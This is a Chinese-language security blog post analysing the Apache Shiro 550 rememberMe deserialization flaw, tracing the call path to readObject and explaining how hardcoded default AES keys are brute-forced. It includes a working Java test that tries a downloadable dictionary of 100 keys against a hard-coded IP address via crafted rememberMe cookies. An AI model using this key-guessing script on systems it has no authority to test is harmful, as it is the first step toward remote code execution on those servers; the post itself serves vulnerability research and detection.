---
typora-root-url: ../../../static
title: "Shiro550反序列化分析"
date: 2021-03-14T22:07:36+08:00
draft: false
categories: ["code_audit"]
---

## 攻击链分析
debug得到整个攻击链的主要路径如下图所示：

![Shiro550攻击链][p1]

代码分析主要从 `AbstracRememberMeManager#getRememberedIdentity入` 手，如下所示：

![入口1][p2]

跟进标红函数，如下所示：

![入口2][p3]

继续跟进 `getRememberedPrincipals()` ，分析如下所示：

![入口3][p4]

此处假设AES解密成功，继续跟进 `deserialize()` ,如下所示：

![入口4][p5]

继续跟进标红函数，如下所示，看打了久违的 `readObject` ，于是造成反序列化漏洞：

![入口5][p6]

## 一些说明
可以看到，shiro反序列化攻击的一个关键点就是 **需要猜解shiro rememberMe配置的AES密钥** ，既然是密钥，为啥会被猜解到呢？主要shiro官方的AbstractRememberMeManager存在默认的硬编码AES密钥，此外，开发者们无脑复制网上的各种示例代码，而示例代码中配置了硬编码的shiro rememberMe密钥，导致攻击者可以搜集网上的各种示例代码中的shiro密钥，从而对靶机进行一个密钥爆破；

攻击过程如下所示：

![shiro攻击过程][p7]

那么我们收集好了shiro密钥字典后，如果进行爆破呢？又如何判断爆破成功呢？这里主要存在两种思路：

- 生成执行请求DNSLog地址的反序列化对象，如果爆破成功，则DNSLog有回显；
- 利用Xray提供的思路：生成一个空的SimplePrincipal反序列化对象，如果爆破成功，则返回包中就不会返回 `rememberMe=deleteMe` ；

一个检测示例代码如下所示（采用Xray方式，代码依赖于Hutool）：

    @Test
    public void testTian() throws Exception{
        // 读取100key
        List<String> keys = FileUtil.readLines(new File("c:/Users/18148/Desktop/shiro100key.txt"), "UTF-8");
        AesCipherService aes = new AesCipherService();
        for (int index=0;index<keys.size();index++) {
            String shiroKey=keys.get(index);
            System.out.println("[*] index："+(index+1)+"，当前正在检测的key为："+shiroKey);
            SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
            String filePath = "c:/Users/18148/Desktop/shiroPayload/payload";
            ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filePath));
            obj.writeObject(simplePrincipalCollection);
            obj.flush();
            obj.close();
            try{
                byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(filePath));
                // shiro的密钥
                byte[] key = cn.hutool.core.codec.Base64.decode(CodecSupport.toBytes(shiroKey));
                ByteSource ciphertext = aes.encrypt(payloads, key);
                // 得到最终的rememberMe payload
                String payload=ciphertext.toString();
                // 攻击地址
                String url="http://101.201.239.35/loginIndex";
                Map<String, List<String>> headers = new HashMap<>();
                ArrayList<String> cookieVal = new ArrayList<>();
                cookieVal.add("rememberMe="+payload);
                headers.put("Cookie",cookieVal);
                headers.put("Accept", Arrays.asList("application/json","text/plain","*/*"));
                HttpRequest request = HttpUtil.createGet(url).header(headers).timeout(10000).disableCache();
                HttpResponse response = request.execute();
                String header = response.header("Set-Cookie");
                if(!header.contains("rememberMe=deleteMe")){
                    System.out.println("[+] 找到key了，key为："+shiroKey);
                    break;
                }else{
                    // 为了避免误报、漏报，显示下header，方便人工判断
                    System.out.println("[!] 当前的header为："+header);
                    System.out.println("===================================================================分割线=======================================================================");
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }

100_shiro_keys下载链接：[100_shiro_keys][l1]



[p1]:/media/2021-03-14-1.png
[p2]:/media/2021-03-14-2.png
[p3]:/media/2021-03-14-3.png
[p4]:/media/2021-03-14-4.png
[p5]:/media/2021-03-14-5.png
[p6]:/media/2021-03-14-6.png
[p7]:/media/2021-03-14-7.png



[l1]:https://p1n93r.github.io/files/shiro100key.txt